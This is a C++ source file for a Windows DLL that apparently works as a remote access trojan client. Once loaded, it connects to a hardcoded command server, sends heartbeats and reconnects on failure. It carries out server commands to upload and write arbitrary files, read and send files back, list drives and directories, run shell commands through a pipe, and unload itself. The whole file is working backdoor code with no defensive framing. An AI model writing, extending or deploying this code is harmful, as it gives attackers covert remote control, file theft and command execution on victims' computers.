#include "pch.h"

#include "..\MyCRT\MyCRT.h"
#pragma comment(lib,"MyCRT")

#include "MyDEBUG.h"
#include "number.h"
#include "RWF.H"
#include "Utility.h"
#include "MyPacket.h"
//项目中定义WIN32_LEAN_AND_MEAN宏,防止Windows.h和winsock2.h中的冲突定义

#define ReconnectionTime 1000
#define HEARTBEAT_TIME 5000
#define IP "127.0.0.1"
#define PORT 9999

MySocket* s = NULL;//因为没有CRT所以不能直接把类声明为全局变量
HANDLE mut = 0;
HMODULE g_hDll;
HANDLE hSendHEARTBEAT = 0;

DWORD WINAPI SendHEARTBEAT(LPVOID lpThreadParameter) {
    char shm[sizeof(MySocket)];
    MySocket* sh = (MySocket*)shm;
    sh = s->New();
    while (true) {
        if (!sh->Send(HEARTBEAT)) {
            //情况1 心跳包线程先出问题:退出心跳包线程 //情况2 RecvPacket先出问题:释放socket以及使心跳包线程自行退出
            sh->FreeCopy();
            return 1;
        }
        Sleep(HEARTBEAT_TIME);
    }
    return 0;
}

DWORD WINAPI RecvPacket(LPVOID lpThreadParameter) {
conn:
    while (!s->Connect(IP, PORT)) {//服务器如果关闭则尝试重连
        MyDebug("Recv Error %d", WSAGetLastError());
        Sleep(ReconnectionTime);
    }
    if (hSendHEARTBEAT != 0) {//让旧的心跳包线程自行退出
        CloseHandle(hSendHEARTBEAT);
    }
    hSendHEARTBEAT = MyCreateThread(SendHEARTBEAT, 0);

    while(true){
        //setsockopt SO_REUSEADDR立刻复用端口
        if(!s->Recv()) {//连接正常关闭 || 连接或处理封包出错
            fail:
            MyDebug("Recv Error %d", WSAGetLastError());
            s->Free();
            goto conn;
        }
        UINT32 command;
        if (!s->ReadUint32(&command)) { MyDebug("ReadUint32 failed");goto fail; }
        switch (command) {
        case UPLOAD: {
            wchar_t* str;
            if (!s->ReadString(&str)) { MyDebug("ReadString failed"); goto fail; }
            void* buf; size_t l;
            if (!s->ReadBytes(&buf, &l)) { MyDebug("ReadBytes failed"); goto fail; }
            {
                RWF f;
                if (f.openFile(str, CREATE_ALWAYS) && f.write(buf, l) == l) {
                    s->WriteUint32(SUCCESS);
                }
                else {
                    s->WriteUint32(FAIL);
                }
                if (!s->Send(CLIENT_PACKET)) { goto fail; }
            }
            break;
        }
        case DOWNLOAD: {//待改：大文件传输
            wchar_t* str;
            void* buf; DWORD l;
            if (!s->ReadString(&str)) { MyDebug("ReadString failed"); goto fail; }
            {
                RWF f;
                if (f.openFile(str)) {
                    l = f.getFileSize();
                    buf = MyAlloc(l);
                    if (buf == NULL)
                        goto DOWNLOAD_FAIL;
                    if (f.read(buf, l) != l)
                        goto DOWNLOAD_FAIL;
                    s->WriteUint32(SUCCESS);
                    s->WriteBytes(buf, l);
                    MyFree(buf);
                }
                else {
                DOWNLOAD_FAIL:
                    s->WriteUint32(FAIL);
                }
                if (!s->Send(CLIENT_PACKET)) { goto fail; }
            }
            break;
        }
        case LSF: {
            wchar_t* str;
            wchar_t sPath[MAX_PATH] = {0};
            WIN32_FIND_DATA fdFile = {0};
            HANDLE hFind = NULL;
            if(!s->ReadString(&str)){ MyDebug("ReadString failed"); goto fail; }
            if (0 == MyStrLenW(str)) {
                wchar_t disk[4] = L"C:\\";
                DWORD v = GetLogicalDrives();
                if (v == 0) {
                    MyDebug("GetLogicalDrivers failed"); goto LSF_CLOSE;
                }
                for (int i = 0; i < 26; i++) {
                    if ((v & 1) != 0) {
                        disk[0] = 'A' + i;
                        s->WriteUint32(0);//不需要属性所以置0
                        s->WriteString(disk);
                    }
                    v >>= 1;
                }
                s->WriteUint32(0xffffffff);//END
                if (!s->Send(CLIENT_PACKET)) { goto fail; }
            }else{
                if (MyStrLenW(str) >= MAX_PATH || MyStrLenW(str) < 3) { MyDebug("Wrong Str"); goto LSF_CLOSE; }
                MyStrCpyW(sPath, str);
                MyStrAddW(sPath, L"\\*.*");

                if ((hFind = FindFirstFileW(sPath, &fdFile)) == INVALID_HANDLE_VALUE)
                {
                    MyDebug("Path not found: [%s]\n", sPath);
                    goto LSF_CLOSE;
                }
                do
                {
                    //Find first file will always return "." and ".." as the first two directories. 
                    if (!MyStrCmpW(fdFile.cFileName, L".")
                        && !MyStrCmpW(fdFile.cFileName, L"..")) {
                        s->WriteUint32(fdFile.dwFileAttributes);//FILE_ATTRIBUTE_DIRECTORY
                        s->WriteString(fdFile.cFileName);
                    }
                } while (FindNextFileW(hFind, &fdFile)); //Find the next file. 
                FindClose(hFind);
            LSF_CLOSE:
                s->WriteUint32(0xffffffff);//END
                if (!s->Send(CLIENT_PACKET)) { goto fail; }
            }
            break;
        }
        case CMD: {
            wchar_t* cmd; wchar_t* dir; UINT32 w = 0, t = 0;
            if (!s->ReadUint32(&w)) { MyDebug("ReadUint32 failed"); goto fail; }
            if (!s->ReadUint32(&t)) { MyDebug("ReadUint32 failed"); goto fail; }
            if (!s->ReadString(&cmd)) { MyDebug("ReadString failed"); goto fail; }
            if (!s->ReadString(&dir)) { MyDebug("ReadString failed"); goto fail; }
            PipeCmd(cmd, MyStrLenW(dir) == 0 ? NULL : dir, s, (bool)w, t);
            if(!s->Send(CLIENT_PACKET)){ goto fail; }
            break;
        }
        case SUICIDE: {
            s->Free();
            WaitForSingleObject(hSendHEARTBEAT, INFINITE);
            CloseHandle(hSendHEARTBEAT);

            FreeLibraryAndExitThread(g_hDll, 0);
            break;
        }
        }
    }
    return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MyDebug("start");

        g_hDll = hModule;
        mut = CreateMutex(NULL, NULL, NULL);
        s = (MySocket*)MyAlloc(sizeof(MySocket));
        if (!s->MySocketInit(mut)) return false;//模拟C++初始化类

        CloseHandle(MyCreateThread(RecvPacket, 0));
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        MyFree(s);
        CloseHandle(mut);
        break;
    }
    return TRUE;
}